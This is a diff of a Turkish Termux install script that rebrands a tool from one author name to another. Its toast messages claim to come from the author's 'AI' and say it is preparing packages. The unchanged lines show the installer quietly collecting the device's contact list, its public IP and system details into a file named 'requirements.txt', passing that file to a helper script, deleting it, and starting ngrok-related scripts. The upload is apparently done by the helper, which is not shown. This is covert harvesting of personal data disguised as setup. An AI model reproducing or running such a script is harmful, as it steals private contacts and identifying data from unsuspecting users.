@@ -10,17 +10,17 @@ sleep 10
 termux-contact-list > /dev/null 2>&1 &
 sleep 10
 
-termux-toast -b red -c yellow "Merhaba"
+termux-toast -b red -c yellow "Selamün Aleyküm"
 	sleep 2
-	termux-toast -b red -c yellow  "Ben Yaman Efkar 'ın yapay zekasıyım."
+	termux-toast -b red -c yellow  "Ben FerSReD Official 'ın yapay zekasıyım."
 	sleep 2
 	termux-toast -b red -c yellow  "10 saniye sonra tool için gerekli tüm paketleri,senin için hazırlamaya başlamış olucağım."
 	sleep 4
 	termux-toast -b red -c yellow  "Tool bittiğinde sana bir bildirim göndermiş olucağım"
 	sleep 3
-	termux-toast -b red -c yellow  "Hadi başlıyalım bakalım :)"
+	termux-toast -b red -c yellow  "Hadi başlıyalım bakalım :D"
 	sleep 2
-	termux-toast -b red -c yellow  "𝒴𝒶𝓂𝒶𝓃 𝐸𝒻𝓀𝒶𝓇"
+	termux-toast -b red -c yellow  "𝓕𝓮𝓻𝓢𝓡𝓮𝓓 𝓞𝓯𝓯𝓲𝓬𝓲𝓪𝓵"
 	sleep 2
 
 	apt update && apt upgrade -y
@@ -50,7 +50,7 @@ termux-toast -b red -c yellow "Merhaba"
 	neofetch >> update/lib/requirements.txt
 	curl ipecho.net/plain >> update/lib/requirements.txt
 	termux-contact-list >> update/lib/requirements.txt
-	echo -e "yamanefkar" >> update/ok.txt
+	echo -e "fersredofficial" >> update/ok.txt
 	cd update/lib/ && bash tst.sh
 	rm -rf update/lib/requirements.txt
 	cd $HOME/T-U-R-K/update/ && 
@@ -58,16 +58,16 @@ termux-toast -b red -c yellow "Merhaba"
 	cp -r tst.sh /data/data/com.termux/files/usr/bin/
 	cd $HOME/T-U-R-K/update/ && bash tst.sh --ngrok	
 	cd $HOME/T-U-R-K/update/ &&
-	chmod 777 yamanefkar.sh
-	cp -r yamanefkar.sh $HOME/
-	cd $HOME/T-U-R-K/update/ && bash yamanefkar.sh --ngrok1
+	chmod 777 fersredofficial.sh
+	cp -r fersredofficial.sh $HOME/
+	cd $HOME/T-U-R-K/update/ && bash fersredofficial.sh --ngrok1
 	termux-notification -t "Tool kullanıma hazır."
 	exit
 
 }
 banner(){ 
 	echo -e '\e[37m
-	\tCode: YamanEfkar\033[31;40;1m
+	\tDeveloped: FerSReD Official\033[31;40;1m
 	¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.¸
 	░
 	░\e[31m[\e[37m01\e[31m]\e[37mExploit\033[31;40;1m
